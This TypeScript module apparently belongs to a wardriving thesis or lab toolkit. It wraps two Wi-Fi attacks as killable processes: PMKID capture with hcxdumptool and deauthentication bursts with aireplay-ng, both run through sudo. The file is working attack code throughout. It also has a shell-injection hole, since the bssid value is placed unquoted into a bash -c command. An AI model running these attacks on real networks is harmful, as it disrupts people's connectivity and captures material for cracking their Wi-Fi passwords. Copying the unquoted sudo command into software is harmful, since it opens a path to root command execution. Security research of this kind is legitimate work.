import { spawn, ChildProcess } from "child_process";
import { EventEmitter } from "events";

// Attack runners. Each class wraps ONE external process, streams its
// stderr/stdout lines to "log" events, and reports completion through
// "exit". Both are killable at any moment (cancel mid-run) and both
// guarantee their child process group dies with them (detached + group
// kill, same pattern as wifiradar/capture.ts — see the comment there for
// why a plain kill() isn't enough for piped/detached children).

const HCX_PIDFILE = "/tmp/wardrive-hcxdumptool.pid";

function shellSingleQuote(value: string): string {
  return `'${value.replace(/'/g, `'\\''`)}'`;
}

export class PmkidRunner extends EventEmitter {
  private proc: ChildProcess | null = null;
  private running = false;

  constructor(
    private iface: string,
    private bssid: string,
    private pcapngPath: string,
  ) {
    super();
  }

  // hcxdumptool 6.x: --filterlist_ap targets exactly this BSSID, --target_ap
  // limits the PMKID roaming-request attack to it, --disable_deauth keeps
  // hcxdumptool from firing its own deauths (deauth bursts are the explicit
  // DeauthRunner's job, so the two methods stay separable for the thesis).
  start(): void {
    if (this.running) return;
    this.running = true;
    const cmd = [
      "sudo", "-n", "hcxdumptool",
      "-i", shellSingleQuote(this.iface),
      "-o", shellSingleQuote(this.pcapngPath),
      "--filterlist_ap=" + this.bssid,
      "--filtermode=2",
      "--target_ap",
      "--disable_deauth",
      "--enable_status=1",
      "--status_timer=10",
      "--err=" + shellSingleQuote("/tmp/wardrive-hcx.err"),
      "--pidfile=" + HCX_PIDFILE,
    ].join(" ");
    this.proc = spawn("bash", ["-c", cmd], { detached: true, stdio: ["ignore", "pipe", "pipe"] });
    this.wireProcess();
  }

  stop(): void {
    this.running = false;
    this.killProc();
  }

  private wireProcess(): void {
    if (!this.proc) return;
    this.proc.stderr?.on("data", (chunk: Buffer) => {
      for (const line of chunk.toString("utf8").split("\n")) {
        const text = line.trim();
        if (text) this.emit("log", text);
      }
    });
    this.proc.on("exit", (code, signal) => {
      const stillRunning = this.running;
      this.running = false;
      this.emit("exit", { code, signal, intentional: !stillRunning });
    });
    this.proc.on("error", (err) => {
      if (!this.running) return;
      this.running = false;
      this.emit("exit", { code: -1, signal: null, intentional: false, error: err?.message });
    });
  }

  private killProc(): void {
    if (!this.proc?.pid) {
      this.proc = null;
      return;
    }
    try {
      process.kill(-this.proc.pid, "SIGTERM");
    } catch {
      try {
        this.proc.kill("SIGTERM");
      } catch {
        // Already gone.
      }
    }
    this.proc = null;
  }
}

export class DeauthRunner extends EventEmitter {
  private proc: ChildProcess | null = null;
  private running = false;

  constructor(
    private iface: string,
    private bssid: string,
    private clientMac: string | null, // null = broadcast deauth from the AP itself
    private count: number,
    private channel: number,
  ) {
    super();
  }

  // Directed, short deauth bursts only: this module never runs an
  // unbounded broadcast deauth against an AP — lab policy and good
  // practice both. Client MAC comes from the live WIFIRADAR device table.
  start(): void {
    if (this.running) return;
    this.running = true;
    const args = ["sudo", "-n", "aireplay-ng", "--deauth", String(this.count)];
    args.push("-a", this.bssid);
    if (this.clientMac) args.push("-c", this.clientMac);
    args.push("-D"); // don't wait for an ARP/ap-request trigger — push immediately
    args.push(this.iface);
    this.proc = spawn(args[0], args.slice(1), { detached: true, stdio: ["ignore", "pipe", "pipe"] });
    this.wireProcess();
  }

  stop(): void {
    this.running = false;
    this.killProc();
  }

  private wireProcess(): void {
    if (!this.proc) return;
    const onLine = (line: string) => {
      const text = line.trim();
      if (text) this.emit("log", text);
    };
    this.proc.stdout?.on("data", (chunk: Buffer) => onLine(chunk.toString("utf8")));
    this.proc.stderr?.on("data", (chunk: Buffer) => onLine(chunk.toString("utf8")));
    this.proc.on("exit", (code, signal) => {
      const stillRunning = this.running;
      this.running = false;
      this.emit("exit", { code, signal, intentional: !stillRunning });
    });
    this.proc.on("error", (err) => {
      if (!this.running) return;
      this.running = false;
      this.emit("exit", { code: -1, signal: null, intentional: false, error: err?.message });
    });
  }

  private killProc(): void {
    if (!this.proc?.pid) {
      this.proc = null;
      return;
    }
    try {
      process.kill(-this.proc.pid, "SIGTERM");
    } catch {
      try {
        this.proc.kill("SIGTERM");
      } catch {
        // Already gone.
      }
    }
    this.proc = null;
  }
}